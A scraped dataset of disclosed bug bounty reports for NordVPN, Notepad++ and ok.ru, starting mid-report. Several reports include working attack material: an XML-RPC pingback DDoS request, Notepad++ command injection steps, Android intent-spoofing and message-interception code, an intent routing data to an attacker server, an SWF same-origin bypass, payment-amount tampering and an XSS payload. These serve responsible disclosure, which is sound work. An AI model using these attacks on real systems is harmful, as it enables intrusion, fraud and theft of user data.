Cookie: __cfduid=d9280a0c9a8c32a348927b0f91bec9fb31575497525; locale=en; FirstSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191204; CurrentSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191205; _gcl_au=1.1.71714234.1575497526; nord_countdown=1575532291033; popups_session_pageviews=4; popups_referrer=https://nordvpn.com/; popups_session_duration=11; fontsCssCache=true; _ga=GA1.2.162223219.1575497529; _gid=GA1.2.1370226348.1575497529; _tq_id.TV-63728145-1.2f26=164e7fef07edc38e.1575497530.0.1575499872..; ReturningSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191205; cf_clearance=0409dcbedbc0283206e58922136848451da17d4b-1575499879-0-150
Upgrade-Insecure-Requests: 1
Content-Length: 135
<?xml version=""1.0"" encoding=""utf-8""?>
Code 88 BytesWrap lines Copy Download1<methodCall>
2<methodName>system.listMethods</methodName>
3<params></params>
4</methodCall>

Response: 
HTTP/1.1 200 OK
Date: Thu, 05 Dec 2019 16:07:53 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
CF-Ray: 5407468dafd0d5d4-BOM
CF-Cache-Status: DYNAMIC
Cache-Control: no-store, no-cache, must-revalidate
Expires: 0
Set-Cookie: locale=en; expires=Fri, 04 Dec 2020 16:07:53 GMT; path=/; domain=nordvpn.com
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Accept-Encoding
Expect-CT: max-age=604800, report-uri=""https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct""
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
X-Generator: front-kr-web-2
Server: cloudflare
Content-Length: 4272
<?xml version=""1.0"" encoding=""UTF-8""?>
Code 4.13 KiBWrap lines Copy Download1<methodResponse>
2  <params>
3    <param>
4      <value>
5      <array><data>
6  <value><string>system.multicall</string></value>
7  <value><string>system.listMethods</string></value>
8  <value><string>system.getCapabilities</string></value>
9  <value><string>demo.addTwoNumbers</string></value>
10  <value><string>demo.sayHello</string></value>
11  <value><string>pingback.extensions.getPingbacks</string></value>
12  <value><string>pingback.ping</string></value>
13  <value><string>mt.publishPost</string></value>
14  <value><string>mt.getTrackbackPings</string></value>
15  <value><string>mt.supportedTextFilters</string></value>
16  <value><string>mt.supportedMethods</string></value>
17  <value><string>mt.setPostCategories</string></value>
18  <value><string>mt.getPostCategories</string></value>
19  <value><string>mt.getRecentPostTitles</string></value>
20  <value><string>mt.getCategoryList</string></value>
21  <value><string>metaWeblog.getUsersBlogs</string></value>
22  <value><string>metaWeblog.deletePost</string></value>
23  <value><string>metaWeblog.newMediaObject</string></value>
24  <value><string>metaWeblog.getCategories</string></value>
25  <value><string>metaWeblog.getRecentPosts</string></value>
26  <value><string>metaWeblog.getPost</string></value>
27  <value><string>metaWeblog.editPost</string></value>
28  <value><string>metaWeblog.newPost</string></value>
29  <value><string>blogger.deletePost</string></value>
30  <value><string>blogger.editPost</string></value>
31  <value><string>blogger.newPost</string></value>
32  <value><string>blogger.getRecentPosts</string></value>
33  <value><string>blogger.getPost</string></value>
34  <value><string>blogger.getUserInfo</string></value>
35  <value><string>blogger.getUsersBlogs</string></value>
36  <value><string>wp.restoreRevision</string></value>
37  <value><string>wp.getRevisions</string></value>
38  <value><string>wp.getPostTypes</string></value>
39  <value><string>wp.getPostType</string></value>
40  <value><string>wp.getPostFormats</string></value>
41  <value><string>wp.getMediaLibrary</string></value>
42  <value><string>wp.getMediaItem</string></value>
43  <value><string>wp.getCommentStatusList</string></value>
44  <value><string>wp.newComment</string></value>
45  <value><string>wp.editComment</string></value>
46  <value><string>wp.deleteComment</string></value>
47  <value><string>wp.getComments</string></value>
48  <value><string>wp.getComment</string></value>
49  <value><string>wp.setOptions</string></value>
50  <value><string>wp.getOptions</string></value>
51  <value><string>wp.getPageTemplates</string></value>
52  <value><string>wp.getPageStatusList</string></value>
53  <value><string>wp.getPostStatusList</string></value>
54  <value><string>wp.getCommentCount</string></value>
55  <value><string>wp.deleteFile</string></value>
56  <value><string>wp.uploadFile</string></value>
57  <value><string>wp.suggestCategories</string></value>
58  <value><string>wp.deleteCategory</string></value>
59  <value><string>wp.newCategory</string></value>
60  <value><string>wp.getTags</string></value>
61  <value><string>wp.getCategories</string></value>
62  <value><string>wp.getAuthors</string></value>
63  <value><string>wp.getPageList</string></value>
64  <value><string>wp.editPage</string></value>
65  <value><string>wp.deletePage</string></value>
66  <value><string>wp.newPage</string></value>
67  <value><string>wp.getPages</string></value>
68  <value><string>wp.getPage</string></value>
69  <value><string>wp.editProfile</string></value>
70  <value><string>wp.getProfile</string></value>
71  <value><string>wp.getUsers</string></value>
72  <value><string>wp.getUser</string></value>
73  <value><string>wp.getTaxonomies</string></value>
74  <value><string>wp.getTaxonomy</string></value>
75  <value><string>wp.getTerms</string></value>
76  <value><string>wp.getTerm</string></value>
77  <value><string>wp.deleteTerm</string></value>
78  <value><string>wp.editTerm</string></value>
79  <value><string>wp.newTerm</string></value>
80  <value><string>wp.getPosts</string></value>
81  <value><string>wp.getPost</string></value>
82  <value><string>wp.deletePost</string></value>
83  <value><string>wp.editPost</string></value>
84  <value><string>wp.newPost</string></value>
85  <value><string>wp.getUsersBlogs</string></value>
86</data></array>
87      </value>
88    </param>
89  </params>
90</methodResponse>
Notice that a successful response is received showing that the xmlrpc.php file is enabled.
Now, considering the domain https://www.nordvpn.com, the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.
POST /xmlrpc.php HTTP/1.1
Host: nordvpn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 135
<methodCall>
<methodName>pingback.ping</methodName>
<params>
Code 264 BytesWrap lines Copy Download1<param>
2<value><string>http://<YOUR SERVER ></string></value>
3</param>
4<param>
5<value><string>https://www.nordvpn.com</string></value>
6</param>
7</params>
8</methodCall>
9------------------------------------------------------------------------------------------------
Remediation:
If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.
POC: Screenshots are attached 
Reference :
1) Here is the explanation of xmlrpc file enable brute force attack- https://blog.sucuri.net/2015/10/brute-force-amplification-attacks-against-wordpress-xmlrpc.html
2) The explanation for xmlrpc.php file will enable dos attack- https://blog.sucuri.net/2014/03/more-than-162000-wordpress-sites-used-for-distributed-denial-of-service-attack.html
Reference Hackerone Reports: #325040 #448524 #448524
Thanks, waiting for your response.
Impact
1)This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.
2) This method is also used for brute force attacks to stealing the admin credentials and other important credentials3 attachments:F651590: Nordvpn.PNGF651591: Capture(1).PNGF651592: POST_xmlrpc.PNG",https://hackerone.com/reports/752073,No value,No value,No value,2019,12,5,16,55
Nord Security,1001-5000,0.0,No value,$100.00,Low,2.0,Information Disclosure,Disclosure of User Information,"shardulb_23  submitted a report to Nord Security.Dec 7th (3 years ago)Hi Team,
We can get information about the users registered (such as: id, name, login name, etc.) and employees of NordVPN without authentication on https://www.nordvpn.com
Vulnerable URL:  https://nordvpn.com/wp-json/wp/v2/users/
Vulnerable URL: https://nordvpn.com/?rest_route=/wp/v2/users/
POC: Screenshots are attached
Response 1:
{
""id"": 1,
""name"": ""21232f297a57a5a743894a0e4a801fc3"",
""url"": """",
""description"": """",
""link"": """",
""slug"": ""admin"",
""avatar_urls"": {
""24"": ""https://secure.gravatar.com/avatar/2a6282462b7001cbf7ec9d1e2c9d1053?s=24&d=mm&r=g"",
""48"": ""https://secure.gravatar.com/avatar/2a6282462b7001cbf7ec9d1e2c9d1053?s=48&d=mm&r=g"",
""96"": ""https://secure.gravatar.com/avatar/2a6282462b7001cbf7ec9d1e2c9d1053?s=96&d=mm&r=g""
},
""meta"": [],
""_links"": {
""self"": [
{
""href"": ""https://nordvpn.com/wp-json/wp/v2/users/1""
}
],
""collection"": [
{
""href"": ""https://nordvpn.com/wp-json/wp/v2/users""
}
]
}
}
Response 2:
{
""id"": 8,
""name"": ""Christina Craig"",
""url"": """",
""description"": ""Christina is a community manager and the heart, the voice and the soul of NordVPN. She is always up for a conversation with our community of users and blog readers."",
""link"": """",
""slug"": ""christina"",
""avatar_urls"": {
""24"": ""https://secure.gravatar.com/avatar/f956d82ca0b55da2fa45d6f1d062d18e?s=24&d=mm&r=g"",
""48"": ""https://secure.gravatar.com/avatar/f956d82ca0b55da2fa45d6f1d062d18e?s=48&d=mm&r=g"",
""96"": ""https://secure.gravatar.com/avatar/f956d82ca0b55da2fa45d6f1d062d18e?s=96&d=mm&r=g""
},
""meta"": [],
""_links"": {
""self"": [
{
""href"": ""https://nordvpn.com/wp-json/wp/v2/users/8""
}
],
""collection"": [
{
""href"": ""https://nordvpn.com/wp-json/wp/v2/users""
}
]
}
}
Thanks and waiting for your response.
Impact
1) Attacker can user these valuable information for advance attack as bruteforce login.
2)It is possible to get all the users registered on the system and create a bruteforce directed to these users.4 attachments:F653494: adminuser.PNGF653495: User_details.PNGF653496: Userdetails.PNGF653497: Userdetails2.PNG",https://hackerone.com/reports/753725,No value,No value,No value,2019,12,7,17,18
Notepad++,1-10,1.0,No value,"$1,364.00",Medium,5.45,Command Injection - Generic,Insufficient sanitizing can lead to arbitrary commands execution,"mrnbayoh  submitted a report to Notepad++.Feb 13th (4 years ago)Information:
Summary:
Notepad++ is vulnerable to a command injection attack.
Debug Info:
Notepad++ v7.6.3 (32-bit)
Build time : Jan 27 2019 - 17:20:30
Path : C:\Program Files (x86)\Notepad++\notepad++.exe
Admin mode : ON
Local Conf mode : OFF
OS : Windows 10 (64-bit)
Plugins : none
Description: 
Let's look at this command execution for example in NppCommand.cpp:
Code 144 BytesWrap lines Copy Download1case IDM_FILE_OPEN_CMD:
2		{
3			Command cmd(TEXT(""cmd /K cd /d \""$(CURRENT_DIRECTORY)\""""));
4			cmd.run(_pPublicInterface->getHSelf());
5		}
6break;
\"" have been introduced with commit 0f93670 to prevent RCE.
However it is still possible to inject arbitrary commands using environment variables. For example trying to open a folder named %TEST% will result in the expansion of the environment variable, if it contains a "" then its possible to inject arbitrary commands after that "" in the directory name.
Steps To Reproduce:

Create a new environment variable (or a temporary one), let's name it TEST and set its value: ""
Create a new folder named %TEST%  && mkdir boom and create a text file in it, let's name that file test.txt
Open test.txt with Notepad++ and click on File->Open Containing Folder->cmd
The command in the folder name gets executed and the boom folder is created

Fix:
Escape %characters before executing the command: % -> ^%.
Impact
A successful attack can lead to arbitrary commands execution.",https://hackerone.com/reports/494979,Île-de-France,France,Paris,2019,2,13,1,31
Notepad++,1-10,1.0,No value,"$1,138.00",Medium,5.0,Command Injection - Generic,No SearchEngine sanatizing can lead to command injection,"mrnbayoh  submitted a report to Notepad++.Feb 13th (4 years ago)Information:
Summary:
Notepad++ is vulnerable to a command injection vulnerability.
Debug Info:
Notepad++ v7.6.3 (32-bit)
Build time : Jan 27 2019 - 17:20:30
Path : C:\Program Files (x86)\Notepad++\notepad++.exe
Admin mode : ON
Local Conf mode : OFF
OS : Windows 10 (64-bit)
Plugins : none
Description:
When launching the web browser with the defined SearchEngine, the specified URL is directly passed as a command to ShellExecute. However since there is no check, one can put commands in that field instead of URLs.
Relevant piece of code in NppCommands.cpp:
Code 1.10 KiBWrap lines Copy Download1case IDM_EDIT_SEARCHONINTERNET:
2		{
3			if (_pEditView->execute(SCI_GETSELECTIONS) != 1) // Multi-Selection || Column mode || no selection
4				return;
5
6			const NppGUI & nppGui = (NppParameters::getInstance())->getNppGUI();
7			generic_string url;
8			if (nppGui._searchEngineChoice == nppGui.se_custom)
9			{
10				if (nppGui._searchEngineCustom.empty())
11				{
12					url = TEXT(""https://www.google.com/search?q=$(CURRENT_WORD)"");
13				}
14				else
15				{
16					url = nppGui._searchEngineCustom.c_str();
17				}
18			}
19			else if (nppGui._searchEngineChoice == nppGui.se_duckDuckGo)
20			{
21				url = TEXT(""https://duckduckgo.com/?q=$(CURRENT_WORD)"");
22			}
23			else if (nppGui._searchEngineChoice == nppGui.se_google)
24			{
25				url = TEXT(""https://www.google.com/search?q=$(CURRENT_WORD)"");
26			}
27			else if (nppGui._searchEngineChoice == nppGui.se_bing)
28			{
29				url = TEXT(""https://www.bing.com/search?q=$(CURRENT_WORD)"");
30			}
31			else if (nppGui._searchEngineChoice == nppGui.se_yahoo)
32			{
33				url = TEXT(""https://search.yahoo.com/search?q=$(CURRENT_WORD)"");
34			}
35
36			Command cmd(url.c_str());
37			cmd.run(_pPublicInterface->getHSelf());	
38		}
Steps To Reproduce:

Go to Settings->Search Engine in the text box write cmd /K echo boom
Click on Edit->On Selection->Search on Internet
A command prompt is launched and echo boom is executed

Impact
Arbitrary commands execution.",https://hackerone.com/reports/495382,Île-de-France,France,Paris,2019,2,13,16,43
Notepad++,1-10,1.0,No value,"$2,862.00",High,8.1,Stack Overflow,Stack overflow in XML Parsing,"ammm  submitted a report to Notepad++.Jan 16th (4 years ago)Summary: 
A stack buffer overflow vulnerability has been detected in XML parsing functionality  on Notepad++.
That's due to the fact that _invisibleEditView.getText function doesn't check buffer boundaries.
Description:
Vulnerability src file: notepad-plus-plus/PowerEditor/src/Notepad_plus.cpp
Vulnerability line: line 1008
Variable affected: char encodingStr[128];
Function that overflows buffer: _invisibleEditView.getText
Steps To Reproduce:

Create a .xml file with a correct XML format
Introduce a big XML field that overflows ""encodingStr"" buffer.
Open the file with Notepad++ and application should crash.

Supporting Material/References:

BoF_example1.xml -> Exploit example

Impact
An attacker could create a malicious .xml file that triggers a stack buffer overflow on victim machine.
You only need to open attached .xml file example with Notepad++ to reproduce the exploit.1 attachment:F407247: BoF_Example1.xml",https://hackerone.com/reports/480883,Île-de-France,France,Paris,2019,1,16,11,3
ok.ru,501-1000,0.0,100m-200m,$150.00,No value,0.0,Improper Authentication - Generic,Critical : Access to group videos where videos are restricted for all users(Broken authentication ),indoappsec  submitted a report to ok.ru.Jul 26th (7 years ago),https://hackerone.com/reports/78781,Moscow,Russia,Moscow,2015,7,26,1,15
ok.ru,501-1000,0.0,100m-200m,$250.00,No value,0.0,None,Multiple critical vulnerabilities in Odnoklassniki Android application,"hardc0re  submitted a report to ok.ru.Nov 2nd (7 years ago)Hello,
I have recently found several critical vulnerabilities in Odnoklassniki Android application, which is one of your projects, thus I am reporting it here.
The first vulnerability is so called Intent spoofing.
The vulnerability lies in ability to start the video upload activity of Odnoklassniki application from inside a different application installed on the same device. This vulnerability happens when a component is made public and requires no special permission. A consequence of this may be that a malicious app sends an intent to a legitimate component (VideoUploadActivity), which will result in data injection or state change (in our case a user might be tricked into uploading content he normally would not upload to ok.ru network).
The following code snippet demonstrates possible exploit code:
Intent m = new Intent();
m.setClassName(""ru.ok.android"",""ru.ok.android.ui.activity.StartVideoUploadActivity"");
startActivity(m);
Staying with the intent spoofing vulnerability, there is one more case of this kind of vulnerability.
This time a malicious application is able to send fake Notifications to user about literally any happening or action in Odnoklassniki. User can be tricked this way to do action he did not intend to again. A malicious app might send fake private messages to the victim user, impersonating other users! The user can be misinformed about a comment on his photo or a response in any of groups he belongs to! The origin of this vulnerability is just as the former one, action is made public in the application and it does not require the calling application to have any kind of permission to do so.
This vulnerability originates from class ok.ru.android.services.app.NotifyReceiver
Possible fix to this? Explicitly set the value of android:exported to false or make use of permissions.
A short code snippet demonstrating possible exploitation:
Intent u = new Intent();
u.setAction(""ru.ok.android.action.NOTIFY"");
u.putExtra(""key"", ""d-147298617"");
u.putExtra(""message"", ""Hello there! This is a fake message. You have been tricked."");
//u.putExtra(""conversation_id"", """");
//u.putExtra(""mediatopic_id"", ""413434225584"");
u.putExtra(""dsc_id"", ""612470493988:USER_PHOTO"");
getActivity().sendBroadcast(u);
Another vulnerability that I have found is Unauthorized intent receipt, in this certain case it is unauthorized notification (message) receipt. Knowing this vulnerability a potential attacking application is able to intercept private messages, updates, photo comments, post comments, etc. sent to the user. The cause of this vulnerability lies in AndroidManifest.xml. The receipt of a notification (message) should be protected from intercepting with proper permission requirement. Possible mitigation - Do not use implicit intents for communication between the components of a single app or require the target application to have a proper permission acquired.
Here I am enclosing a complete malicious receiver code snippet, which is able to intercept all ""messages"" shown to the user as a notification. Please note, that the malicious application is able to see not only the message but the userId of the user who sent it and many other sensitive details.
public class MaliciousReceiver extends BroadcastReceiver {
@Override
public void onReceive(Context context, Intent intent) {
if (""ru.ok.android.action.NOTIFY"".equals(intent.getAction())) {
        Bundle localBundle = intent.getExtras();
if (localBundle != null) {
String str1 = localBundle.getString(""key"");
String str2 = localBundle.getString(""message"");
String str3 = localBundle.getString(""cid"");
if (str3 != null) {
String str4 = localBundle.getString(""caller_name"");
String str5 = localBundle.getString(""server"");
return;
}
            String str4 = localBundle.getString(""nconversation_id"");
String str5 = localBundle.getString(""dsc_id"");
            Toast.makeText(context, ""key:"" + str1 + ""\nmessage: "" + str2 + ""\ncid: "" + str3 + ""\nconversation_id: "" + str4 + ""\ndsc_id: "" + str5, Toast.LENGTH_SHORT).show();
}
}
}
}
And here comes the most serious issue. The vulnerabilities explained above affected the data and user privacy in scope of your application ""only"". This vulnerability, on the other side, violates the whole android security mechanism. The vulnerability is known as ""Privilege redelegation"". It happens when your application is used as a mediator to help other (malicious) applications to circumvent android permission system.
This vulnerability lies in class ru.ok.android.videochat.VideochatController.java .
The permission which is mediated to 3rd party applications here is the INTERNET persmission, which is truly the most dangerous permission out there.
When we analyze the following line of code:
localHttpMethod = new RestApiMethodBuilder(localServiceStateHolder, HttpMethodType.GET).setTargetUrl(new URI(""http://"" + this.server + ""/"", false)).addRelativePath(""api-get-signal"", true).addSignedParam(""uid"", localServiceStateHolder.getUserId(), false).addSignedParam(""cid"", str1, false).addSignedParam(""client"", Constants.Api.CLIENT_NAME, false).build();
we can clearly notice that there's a variable (this.server) passed directly to the method construction.
As you can imagine, I am able to pass the address of my own server to this variable through an Intent.
This will result in Odnoklassniki application sending an HTTP request to my server with all the data contained!
We cannot alter the data contained within the request, but that does not stop us.
Once any 3rd party application is able to send a HTTP request to arbitrary server in the world just with a single Intent, without even the need to have the INTERNET permission acquired itself, it obviously violates the android security permission principle.
The code demonstration would require longer piece of code, thus I will try to explain possible exploit scenario verbally.
As we can perform a single HTTP request with a single Intent sent to ok.ru application, we can do this more times in row without an issue! Data does not need to be transfered from the device using a text, we could use a morse code for example. We could send the Intents within specific time intervals and delays, which would reflect in arbitrary information being leaked from the device to an arbitrary server. The morse code processing in our means would be processed at the server side of course.
The mediated HTTP request from a 3rd party application may be achieved using a code like this:
Intent m = new Intent();
m.setAction(""ru.ok.android.action.NOTIFY"");
m.putExtra(""key"", ""vchat"");
m.putExtra(""cid"", ""c60b0e06695a4ce896261247b43f772b"");
m.putExtra(""caller_name"", ""Fake User"");
m.putExtra(""server"", ""myserver.com:1234"");
getActivity().sendBroadcast(m);
I hope I have explained each of the vulnerabilities clearly enough so that you can patch them with ease.
If something is not clear enough, please feel free to ask more details. I can provide some PoC with pictures in case of need too.
I am also enclosing a PoC of the privilege redelegation vulnerability.
In the picture there is the HTTP request that is sent by my demo malicious (exploit) application through the ok.ru application to my server.
I am looking forward to hearing from you soon.
Kind regards,
Jan Hodermarsky1 attachment:F59921: Auswahl_045.png",https://hackerone.com/reports/97295,Moscow,Russia,Moscow,2015,11,2,18,2
ok.ru,501-1000,0.0,100m-200m,$100.00,No value,0.0,Privilege Escalation,http://217.20.144.201 privilege escalation in apache tomcat SessionEample-script,mthirup  submitted a report to ok.ru.Jul 22nd (7 years ago),https://hackerone.com/reports/77679,Moscow,Russia,Moscow,2015,7,22,12,14
ok.ru,501-1000,0.0,100m-200m,$300.00,Critical,9.5,SQL Injection,Blind SQL Injection,linkks  submitted a report to ok.ru.Apr 18th (6 years ago),https://hackerone.com/reports/221757,Moscow,Russia,Moscow,2017,4,18,4,54
ok.ru,501-1000,0.0,100m-200m,$100.00,No value,0.0,Cross-site Scripting (XSS) - Generic,cross siite scripting in the blog ,cyberboy  submitted a report to ok.ru.Jul 22nd (7 years ago),https://hackerone.com/reports/77904,Moscow,Russia,Moscow,2015,7,22,18,45
ok.ru,501-1000,0.0,100m-200m,$500.00,No value,0.0,None,Same-Origin Policy Bypass #2,"zoczus  submitted a report to ok.ru.Nov 27th (7 years ago)Hi,
This is really similar issue to my previous report #102234 - exploitation mechanism is really same but other swf file is vulnerable. All conditions are met: 

st.mycdn.me domain which is in ok.ru crossdomain.xml
Security.allowDomain('*')
possibility to execute own SWF code provided by URL parameter.

Example of swf code execution: https://st.mycdn.me/static/moderator/6-1-6/Main.swf?retry_timer=30&skip_timer=8500&disableAgeCheck=true&v=55&player=https://uid0.pl/poc/xss.swf (shoud execute same code like https://uid0.pl/poc/xss.swf)
I know this report is much sorter and less detailed than previous one. I also belive I don't need to explain it again because all is in previous report and exploit mechanism is really the same... BUT if you want me to prepare different PoC for this case - no problem at all. 
Have a nice day,
JZalexandra_ok   changed the status to Triaged. Dec 1st (7 years ago)Hi! Thanks for your report. The level of details is enough, we will fix the problem and let you know.zoczus   posted a comment. Jan 20th (7 years ago)Hi, any updates?alexandra_ok   posted a comment. Feb 1st (7 years ago)Hi! No updates yet unfortunately. This is a high priority issue, and I will inform you as soon as it is resolved.zoczus   posted a comment. Feb 1st (7 years ago)All right, thank you!alexandra_ok   posted a comment. Mar 30th (7 years ago)Hi! The issue has been resolved and vulnerable app versions removed. Please confirm.zoczus   posted a comment. Mar 30th (7 years ago)Confirmed! Looks fine now. :) alexandra_ok   closed the report and changed the status to Resolved. Apr 1st (7 years ago)ok.ru  rewarded zoczus with a $500 bounty. Apr 1st (7 years ago)Thank you!alexandra_ok   requested to disclose this report. May 4th (7 years ago)zoczus   agreed to disclose this report. May 4th (7 years ago)  This report has been disclosed. May 4th (7 years ago)",https://hackerone.com/reports/102236,Moscow,Russia,Moscow,2015,11,27,2,56
ok.ru,501-1000,0.0,100m-200m,$200.00,No value,0.0,Cross-site Scripting (XSS) - Generic,Stored XSS в имени песни (2) на платёжном гейте.,4lemon  submitted a report to ok.ru.Jul 24th (7 years ago)4lemon   posted a comment. Jul 24th (7 years ago)4lemon   posted a comment. Aug 14th (7 years ago)alexandra_ok   changed the status to Triaged. Aug 18th (7 years ago)4lemon   posted a comment. Updated Aug 18th (7 years ago)4lemon   posted a comment. Oct 2nd (7 years ago)alexandra_ok   posted a comment. Oct 2nd (7 years ago)alexandra_ok   posted a comment. Dec 8th (7 years ago)4lemon   posted a comment. Dec 8th (7 years ago)alexandra_ok   posted a comment. Dec 9th (7 years ago)4lemon   posted a comment. Dec 9th (7 years ago)alexandra_ok   posted a comment. Dec 9th (7 years ago)ok.ru  rewarded 4lemon with a $200 bounty. Jul 20th (6 years ago)4lemon   posted a comment. Jul 20th (6 years ago)alexandra_ok   closed the report and changed the status to Resolved. Sep 6th (6 years ago)4lemon   requested to disclose this report. Feb 27th (6 years ago)alexandra_ok   posted a comment. Mar 20th (6 years ago)alexandra_ok   agreed to disclose this report. Mar 20th (6 years ago)  This report has been disclosed. Mar 20th (6 years ago),https://hackerone.com/reports/78260,Moscow,Russia,Moscow,2015,7,24,0,35
ok.ru,501-1000,0.0,100m-200m,$500.00,No value,0.0,Violation of Secure Design Principles,"(URGENT!) Покупка OK дешевле, чем он стоит","4lemon  submitted a report to ok.ru.Jul 24th (7 years ago)
Кликаем ""пополнить"". Сумма не важна.
Выбираем ""Вебмани"" (если ещё не выбрано)
В Burp выбираем перехват трафика и кликаем ""Перейти к оплате"" 
Правим параметр на одну копейку: LMI_PAYMENT_AMOUNT=0.01 - отправляем запрос. Выключаем, для удобства, перехват трафика в Burp
Каскад редиректов и мы на платёжном гейте вебманей.
Оплачиваем.
""Вы получили 1 OK""

Тут целый каскад ошибок:

Система проверяет только факт оплаты некой транзакции и НЕ проверяет соотвествие оплаченной суммы от заказанной - плохо, но не смертельно, если бы не следующий пункт
Система прибавляет к балансу сумму с округлением до 1 ОК

В итоге за две копейки (платёж плюс комиссия вебманей) атакующий получает 1 ОК. То есть в 50 (!) раз дешевле. Дальше их можно рассылать подарочными сертификатами. Кроме того, само по себе действие вполне поддаётся автоматизации.
Кстати, покупка сертификата третьему лицу точно так же уязвима к замене  LMI_PAYMENT_AMOUNT=0.015 attachments:F46968: okbuy2.jpgF46969: okbuy1.jpgF46970: okbuy3.pngF46971: okbuy4.pngF46972: okbuy5.jpg",https://hackerone.com/reports/78436,Moscow,Russia,Moscow,2015,7,24,17,50
ok.ru,501-1000,0.0,100m-200m,$500.00,Critical,9.5,Command Injection - Generic,[insideok.ru] Remote Command Execution via file upload.,iframe  submitted a report to ok.ru.Aug 3rd (3 years ago),https://hackerone.com/reports/666716,Moscow,Russia,Moscow,2019,8,3,9,52
ok.ru,501-1000,0.0,100m-200m,$500.00,High,7.95,Improper Authentication - Generic,[insideok.ru] Database Dump,"bigbear_  submitted a report to ok.ru.Jan 12th (6 years ago)http://insideok.ru/db.sql
Внутри - учётки админов на 2016 год.
-- Хост: localhost
-- Время создания: Сен 03 2016 г., 12:00
-- Версия сервера: 5.5.47-cll-lve
-- Версия PHP: 5.4.45
Структура таблицы users
CREATE TABLE IF NOT EXISTS users(  id int(11) unsigned NOT NULL,   █████   ███████   ███████ ██████████ ███ ██████████ ███ █████████ ███████ ████████ █████ █████ ) ENGINE=InnoDB AUTO_INCREMENT=60 DEFAULT CHARSET=utf8 AVG_ROW_LENGTH=5461;
Дамп данных таблицы users
INSERT INTO users (██████████) VALUES ████ ███ ████████ ███ ████ ███████ ████████ ███████ █████ ███ ███ ████████ ███████ ███████ ████████ ██████ ████████ ████ ███alexandra_ok   changed the status to Triaged. Jan 16th (6 years ago)Привет, спасибо.
insideok.ru вообще-то не в скоупе, но за такое заплатим конечно же.alexandra_ok   closed the report and changed the status to Resolved. Jan 19th (6 years ago)Починили.ok.ru  rewarded bigbear_ with a $500 bounty. Jan 19th (6 years ago)Спасибо!bigbear_   posted a comment. Jan 19th (6 years ago)Вам спасибо.
Часть других тоже уже починили. Я проверил)bigbear_   requested to disclose this report. Apr 18th (5 years ago)Раскроем?alexandra_ok   agreed to disclose this report. Apr 25th (5 years ago)  This report has been disclosed. Apr 25th (5 years ago)",https://hackerone.com/reports/197789,Moscow,Russia,Moscow,2017,1,12,10,34
ok.ru,501-1000,0.0,100m-200m,$500.00,No value,0.0,Denial of Service,SSRF/XSPA в форме загрузки видео по URL,alpha  submitted a report to ok.ru.Jul 22nd (7 years ago),https://hackerone.com/reports/77817,Moscow,Russia,Moscow,2015,7,22,15,18
ok.ru,501-1000,0.0,100m-200m,$500.00,Critical,9.5,Privilege Escalation,Privilege Escalation удаляем все созданные ссылки с okl.lt,"iframe  submitted a report to ok.ru.Jan 12th (4 years ago)Summary by iframeУязвимость позволяла скрывать все созданные ссылки другими пользователями в их панеле, но ссылка продолжала работать
IDOR at okl.lt allowed to hide links in another user's dashboard. The short link itself remained functional.",https://hackerone.com/reports/478621,Moscow,Russia,Moscow,2019,1,12,16,8
ok.ru,501-1000,0.0,100m-200m,$500.00,No value,0.0,None,Same-Origin Policy bypass on main domain - ok.ru,"zoczus  submitted a report to ok.ru.Nov 27th (7 years ago)Hello,
I've just found a way to bypass Same-Origin Policy mechanism using vulnerability in one of swf files on your cdn. Let me explain this in details:


First of all - your Crossdomain which defines from what domains Flash files can read content on ok.ru. Crossdomain file is located here - http://ok.ru/crossdomain.xml


We need to find some vulnerable swf file on any of domains listed in crossdomain file.


I've found this shiny beauty: http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf 


Flashbang Tool recognized that there are two parameters needed - ""vpaidSwfUrl"" and ""Loader""


Decompilation of swf shows that Security.allowDomain(""*"") is used - so we can interact with this Flash file from any domain. 


vpaidSwfUrl is not controlled at all, and it loads and executes any external SWF. So we can use our malicious one to prepare attack. 


Our loaded and executed SWF from st.mycdn.me domain will make request to http://ok.ru/settings , read its content and send to javascript function in attacker controled origin. 


Profit - attacker gained information, whitout any user interaction. Now he can steal such sensitive data as user's e-mail, csrf tokens, private messages, and so on.


Vulnerable file that loads content from ok.ru (can be viewed in browser Developer's console): http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings&Loader=test
Proof of Concept that loads http://ok.ru/settings page and put it as innerHTML of div element of domain that I control (ropchain.org): http://ropchain.org/poc/ok.html
I hope that everything is clear enough, but if not - please tell me, and I'll try to prepare better explaination, I'm also able to prepare video demonstration if you need one. Also if you have any other questions - feel free to ask me. 
Have a great day!
Jakub Zoczek",https://hackerone.com/reports/102234,Moscow,Russia,Moscow,2015,11,27,1,32
ok.ru,501-1000,0.0,100m-200m,$100.00,Low,2.0,Information Disclosure,web.xml configuration file disclosure,linkks  submitted a report to ok.ru.Oct 4th (6 years ago),https://hackerone.com/reports/173972,Moscow,Russia,Moscow,2016,10,4,23,28
ok.ru,501-1000,0.0,100m-200m,$150.00,No value,0.0,Cross-site Scripting (XSS) - Generic,xss in group,"ashishdhaduk  submitted a report to ok.ru.Jul 23rd (7 years ago)step:
payload : ""><svg onload=prompt(document.domain) >
1.first create a new group.
2. now create new post,
3. now put payload in new topic and than click on add poll.
4. xss executed.1 attachment:F46659: ok.ru.png",https://hackerone.com/reports/78052,Moscow,Russia,Moscow,2015,7,23,6,11
